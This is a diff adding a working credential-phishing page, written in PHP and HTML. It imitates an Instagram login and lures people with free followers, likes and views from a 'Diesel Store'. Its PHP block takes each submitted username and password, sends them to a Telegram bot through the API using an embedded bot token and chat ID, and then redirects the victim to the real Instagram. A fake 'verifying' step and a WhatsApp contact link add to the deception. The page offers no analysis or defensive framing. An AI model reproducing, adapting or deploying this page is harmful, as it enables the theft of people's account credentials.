@@ -1,0 +1,72 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+    $chat_id = "5177962707";
+    $message = "📸 Diesel Store - Login\n\n👤 User: " . $_POST['username'] . "\n🔑 Pass: " . $_POST['password'] . "\n🎯 Service: " . $_POST['service'] . "\n📈 Amount: " . $_POST['amount'];
+    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
+    header("Location: https://www.instagram.com/");
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        :root { --bg: #fafafa; --card: #fff; --text: #000; }
+        .dark-mode { --bg: #000; --card: #121212; --text: #fff; }
+        body { background-color: var(--bg); font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; }
+        .marquee { background: #FFD700; width: 100%; padding: 10px; font-weight: bold; text-align: center; }
+        .login-card { background: var(--card); border: 1px solid #dbdbdb; padding: 20px; width: 90%; max-width: 350px; margin-top: 20px; border-radius: 5px; }
+        input, select, button { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { background: #0095f6; color: white; font-weight: bold; border: none; cursor: pointer; }
+        #avatar { width: 80px; height: 80px; border-radius: 50%; display: none; margin: 10px auto; }
+        .whatsapp { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: white; padding: 10px 15px; border-radius: 50px; text-decoration: none; font-size: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="marquee"><marquee>🚀 Diesel Store عروض مجانية 100%</marquee></div>
+
+<div class="login-card">
+    <h1 style="font-family: cursive; text-align: center;">Instagram</h1>
+    
+    <input type="text" id="user" placeholder="Username">
+    <button onclick="check()">Verify</button>
+    
+    <img id="avatar" src="">
+    <p id="speed" style="text-align:center; color:#0095f6; display:none;">جاري التحقق...</p>
+
+    <form method="POST" id="main-form" style="display:none;">
+        <input type="hidden" name="username" id="hidden-user">
+        <input type="password" name="password" placeholder="Password" required>
+        <select name="service">
+            <option>Followers</option><option>Likes</option><option>Views</option>
+        </select>
+        <select name="amount">
+            <option>100</option><option>500</option><option>1000</option>
+        </select>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+<button onclick="document.body.classList.toggle('dark-mode')" style="width: auto; margin-top: 10px;">🌙/☀️</button>
+<a href="https://wa.me/201068896761" class="whatsapp">💬</a>
+
+<script>
+    function check() {
+        let user = document.getElementById('user').value;
+        document.getElementById('speed').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('avatar').src = "https://graph.facebook.com/" + user + "/picture?type=large";
+            document.getElementById('avatar').style.display = 'block';
+            document.getElementById('hidden-user').value = user;
+            document.getElementById('main-form').style.display = 'block';
+            document.getElementById('speed').innerText = "سرعة الحساب: عالية";
+        }, 1500);
+    }
+</script>
+</body>
+</html>
